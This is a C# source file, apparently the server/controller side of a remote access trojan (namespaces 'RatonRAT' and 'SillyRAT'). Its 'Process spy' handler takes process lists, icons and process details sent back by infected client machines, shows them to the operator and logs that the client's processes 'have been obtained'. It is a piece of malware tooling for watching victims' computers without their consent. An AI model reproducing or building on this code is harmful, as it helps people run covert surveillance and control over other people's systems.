using Stuff;
using RatonRAT.ClientForms;
using Server.Connection;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using SillyRAT;

namespace Server.Handlers
{
    internal class HandleProcessManager
    {
        public HandleProcessManager(SillyClient SillyClient, Unpack unpack)
        {
            string formname = "Process spy | Client ID: ";
            Formproccess processManagerForm = (Formproccess)Application.OpenForms[formname + unpack.GetAsString("UID")];
            if (processManagerForm != null)
            {
                if (processManagerForm.SillyClient == null)
                {
                    processManagerForm.SillyClient = SillyClient;
                    processManagerForm.timer1.Start();
                }
                processManagerForm.Invoke(new MethodInvoker(() =>
                {
                    switch (unpack.GetAsString("Command"))
                    {
                        case "List":
                            {
                                string[] processes = unpack.GetAsString("Processes").Split(new[] { "-=>" }, StringSplitOptions.None);
                                processManagerForm.listView1.Items.Clear();
                                processManagerForm.imageList1.Images.Clear();
                                processManagerForm.listView1.BeginUpdate();
                                int processCount = 0;
                                for (int x = 0; x < processes.Length - 1; x++)
                                {
                                    string randomIconName = Helpers.Random();
                                    ListViewItem listViewItem = new ListViewItem();
                                    listViewItem.Text = processes[x];
                                    listViewItem.SubItems.Add(processes[x + 1]);
                                    listViewItem.SubItems.Add(processes[x + 2]);
                                    listViewItem.SubItems.Add(processes[x + 3]);

                                    if (processes[x + 4].Trim() != "N/A")
                                    {
                                        Image icon = Image.FromStream(new MemoryStream(Convert.FromBase64String(processes[x + 4])));
                                        processManagerForm.imageList1.Images.Add(randomIconName, icon);
                                        listViewItem.ImageKey = randomIconName;
                                    }
                                    else
                                    {
                                        if (!processManagerForm.imageList1.Images.ContainsKey("Admin"))
                                            processManagerForm.imageList1.Images.Add("Admin", RatonRAT.Properties.Resources.Admin);
                                        listViewItem.ImageKey = "Admin";
                                    }
                                    listViewItem.Tag = processes[x + 1];
                                    processManagerForm.listView1.Items.Add(listViewItem);
                                    processCount++;
                                    x += 4;
                                }
                                processManagerForm.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
                                processManagerForm.listView1.EndUpdate();
                                foreach (ColumnHeader column in processManagerForm.listView1.Columns)
                                {
                                    column.Width = processManagerForm.listView1.Width / processManagerForm.listView1.Columns.Count;
                                }

                                Program.form2.Invoke(new Action(() =>
                                {
                                    Program.form2.AddLog("The client's system processes have been obtained", Color.White);
                                }));
                                break;
                            }
                        case "Info":
                            {
                                string processInfo = unpack.GetAsString("Data");
                                byte[] iconBytes = unpack.GetAsByteArray("Icon");
                                if (string.IsNullOrEmpty(processInfo)) return;

                                FormProcessInfo processManager_Info = new FormProcessInfo();
                                processManager_Info.Text = "Process spy | " + unpack.GetAsString("ProcessName") + " | " + unpack.GetAsString("ProcessId");

                                processManager_Info.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage; 

                                if (iconBytes == null)
                                    processManager_Info.pictureBox1.Image = RatonRAT.Properties.Resources.Admin;
                                else
                                    processManager_Info.pictureBox1.Image = Image.FromStream(new MemoryStream(iconBytes));

                                processManager_Info.textBox1.Text = processInfo;
                                processManager_Info.Show();
                                Program.form2.Invoke(new Action(() =>
                                {
                                    Program.form2.AddLog("The process information was obtained", Color.White);
                                }));
                                break;
                            }

                    }
                }));
            }
        }
    }
}
